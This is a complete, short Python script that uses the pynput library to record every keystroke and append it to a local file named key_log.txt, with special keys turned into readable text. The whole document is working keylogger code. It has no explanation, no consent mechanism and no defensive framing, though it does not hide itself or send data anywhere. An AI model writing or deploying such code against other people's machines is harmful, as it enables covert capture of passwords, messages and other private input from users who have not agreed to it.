from pynput.keyboard import Key, Listener

# Path to save the log file
log_file = "key_log.txt"

# Function to write keystrokes to the log file
def write_to_file(key):
    with open(log_file, "a") as f:
        # Replace special keys (e.g., Enter, Space) with readable strings
        if key == Key.space:
            f.write(" ")
        elif key == Key.enter:
            f.write("\n")
        elif key == Key.backspace:
            f.write("<BACKSPACE>")
        else:
            # Strip quotes from key string
            f.write(str(key).replace("'", ""))

# Function called when a key is pressed
def on_press(key):
    write_to_file(key)

# Start listening for keyboard input
with Listener(on_press=on_press) as listener:
    listener.join()
